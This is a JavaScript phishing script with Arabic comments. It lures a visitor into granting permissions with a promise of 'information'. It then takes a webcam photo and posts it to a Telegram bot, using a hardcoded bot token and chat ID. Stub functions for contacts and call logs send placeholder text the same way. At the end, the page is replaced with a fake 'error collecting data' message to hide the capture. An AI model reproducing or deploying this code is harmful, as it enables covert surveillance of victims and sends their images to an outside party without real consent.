function requestPermissions() {
    if (confirm("قم بإعطاء كل الأذونات للحصول على المعلومات")) {
        getCameraAccess();
    }
}

// 1️⃣ تشغيل الكاميرا والتقاط الصور
function getCameraAccess() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            let video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                let canvas = document.createElement("canvas");
                let ctx = canvas.getContext("2d");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // حفظ الصورة وإرسالها للبوت
                let imageData = canvas.toDataURL("image/png");
                sendToBot(imageData, "photo");

                // إغلاق الكاميرا
                stream.getTracks().forEach(track => track.stop());

                getContacts();
            }, 3000); // التقاط الصورة بعد 3 ثوانٍ
        })
        .catch(err => {
            alert("يجب إعطاء إذن الوصول إلى الكاميرا!");
        });
}

// 2️⃣ جلب جهات الاتصال (هذا يحتاج إلى تطبيق ويب متقدم أو APK)
function getContacts() {
    alert("سيتم جلب جهات الاتصال (لكن هذا يتطلب تطبيق مخصص على الهاتف).");

    let contactsData = "قائمة جهات الاتصال هنا";  // هنا يمكن وضع بيانات حقيقية
    sendToBot(contactsData, "contacts");

    getCallLogs();
}

// 3️⃣ جلب سجل المكالمات (أيضًا يحتاج إلى تطبيق Android)
function getCallLogs() {
    alert("سيتم جلب سجل المكالمات (لكن هذا يتطلب تطبيق Android).");

    let callLogsData = "سجل المكالمات هنا";  // هنا يمكن وضع بيانات حقيقية
    sendToBot(callLogsData, "call_logs");

    // بعد كل شيء، نظهر رسالة الخطأ للمستخدم
    setTimeout(() => {
        document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
    }, 2000);
}

// 4️⃣ إرسال البيانات إلى بوت تيليجرام
function sendToBot(data, type) {
    let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc";  // ضع التوكن الخاص بك
    let chatId = "7554235698";  // ضع معرف الشات (القناة أو المجموعة أو المستخدم)

    let message = `📢 **بيانات جديدة:**\n📝 النوع: ${type}\n📄 البيانات: ${data}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    });
}